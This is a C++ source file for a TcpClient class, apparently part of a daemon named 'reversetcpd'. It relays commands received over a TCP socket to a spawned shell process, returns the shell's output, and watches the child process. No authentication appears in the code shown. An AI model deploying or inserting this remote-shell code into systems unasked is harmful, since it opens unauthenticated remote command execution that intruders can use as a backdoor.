#include <TcpClient.h>

#include <ReverseTcpShell.h>

#include <iterator>
#include <sstream>

#include <sys/wait.h>

namespace
{

/*
 *  @brief  Remove control characters from a string.
 *
 *  @param  messageString the string to sanitize.
 */
void RemoveCtrlChars(std::string &messageString)
{
    messageString.erase(std::remove_if(messageString.begin(), messageString.end(),
        [](char c)
        {
            const bool isNewLine = ('\n' == c);
            const bool shouldRemove = std::iscntrl(c) && !isNewLine;
            return shouldRemove;
        }), messageString.end());
}

/*
 *  @brief  Get the connection information string.
 *
 *  @param  socket the asio tcp socket object reference.
 * 
 *  @return string identifying the connection.
 */
std::string ConnectionString(const asio::ip::tcp::socket &socket)
{
    std::ostringstream ss;

    try
    {
        if (socket.is_open())
            ss << socket.remote_endpoint().address().to_string() << ":" << socket.remote_endpoint().port();
    }
    catch(const std::exception& e)
    {
    }

    return ss.str();
}

} // namespace

const asio::chrono::milliseconds TcpClient::WATCH_TIMER_DURATION = asio::chrono::milliseconds(100);

TcpClient::TcpClient(asio::io_context &ioContext) :
    m_ioContext(ioContext),
    m_socket(m_ioContext),
    m_childWatchTimer(m_ioContext, WATCH_TIMER_DURATION)
{
    // const asio::socket_base::keep_alive keepAliveOption(true);
    // m_socket.set_option(keepAliveOption);
}

TcpClient::~TcpClient()
{
}

void TcpClient::Start()
{
    m_pReverseTcpShellTask.reset(new Task::ReverseTcpShell(m_ioContext));

    //! Schedule reads from the socket and shell before starting the reverse tcp shell
    //! to avoid missing data after starting.
    ReadFromSocket();
    ReadFromShell();

    if (!m_pReverseTcpShellTask->Start())
    {
        //! Close connection if the tcp shell fails to start.
        std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - unable to start shell." << '\n';

        Cancel();
    }
    else
    {
        std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - started shell." << '\n';
        
        //! Start the child shell process watchdog timer.
        m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
    }
}

void TcpClient::Cancel()
{
    m_socket.cancel();
    m_childWatchTimer.cancel();
    m_pReverseTcpShellTask.reset();
}

void TcpClient::WriteToSocket(const std::string &message)
{
    asio::async_write(GetSocket(), asio::buffer(message),
        std::bind(&TcpClient::OnWriteToSocket, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnWriteToSocket(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - OnWriteToSocket error: " << error.message() << '\n';
        return;
    }
}

void TcpClient::ReadFromSocket()
{
    asio::async_read_until(GetSocket(), m_socketInputBuffer, "\n",
        std::bind(&TcpClient::OnReadFromSocket, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnReadFromSocket(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        if (asio::error::operation_aborted != error.value())
            std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - OnReadFromSocket error: " << error.message() << '\n';

        return;
    }

    //! Sanitize the received shell command by removing control characters.
    std::string message = std::string(std::istreambuf_iterator<char>(&m_socketInputBuffer), std::istreambuf_iterator<char>());
    RemoveCtrlChars(message);

    //! Send sanitized shell command to the shell process.
    WriteToShell(message);

    //! Schedule another asynchronous read from the client.
    ReadFromSocket();
}

void TcpClient::WriteToShell(const std::string &message)
{
    asio::async_write(m_pReverseTcpShellTask->GetParentSocket(), asio::buffer(message),
        std::bind(&TcpClient::OnWriteToShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnWriteToShell(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - OnWriteToShell error=" << error.message() << '\n';
        return;
    }
}

void TcpClient::ReadFromShell()
{
    m_pReverseTcpShellTask->GetParentSocket().async_read_some(asio::buffer(m_shellInputBuffer, m_shellInputBuffer.size()),
        std::bind(&TcpClient::OnReadFromShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
}

void TcpClient::OnReadFromShell(const asio::error_code &error, const size_t nBytesTransferred)
{
    if (error)
    {
        if (asio::error::operation_aborted != error.value())
            std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - OnReadFromShell error=" << error.message() << '\n';

        return;
    }

    //! Assign the standard output data obtained from the child shell process into
    //! a string and send it to the client through the tcp socket.
    std::string message;
    message.assign(m_shellInputBuffer.data(), nBytesTransferred);
    WriteToSocket(message);
    
    //! Schedule another asynchronous read from the shell.
    ReadFromShell();
}

void TcpClient::CheckShellAlive(const asio::error_code &error)
{
    if (!m_pReverseTcpShellTask)
    {
        //! If the task object doesn't exist yet, schedule another timer and return.
        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + WATCH_TIMER_DURATION);
        m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
        
        return;
    }

    const auto shellState = m_pReverseTcpShellTask->HasShellTerminated();
    if (shellState.first)
    {
        //! Child terminated.

        //! If the child process has exited, cancel all the scheduled asio io operations
        //! and close the connection.
        std::cout << "reversetcpd: " << ConnectionString(m_socket) << " - shell pid="
            << m_pReverseTcpShellTask->GetShellPid() << " ";

        if (WIFEXITED(shellState.second))
        {
            std::cout << "exited, exit status=" << WEXITSTATUS(shellState.second);
        }
        else if (WIFSIGNALED(shellState.second))
        {
            const int signal = WTERMSIG(shellState.second);
            std::cout << "was signaled, signal=" << signal << " - " << strsignal(signal);
        }
        else if (WIFSTOPPED(shellState.second))
        {
            const int signal = WSTOPSIG(shellState.second);
            std::cout << "was stopped, signal=" << signal << " - " << strsignal(signal);
        }

        std::cout << '\n';

        Cancel();
    }
    else
    {
        //! If the child process is still alive, schedule another timer.
        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + WATCH_TIMER_DURATION);
        m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
    }
}

TcpClient::Pointer TcpClient::Create(asio::io_context &ioContext)
{
    return Pointer(new TcpClient(ioContext));
}
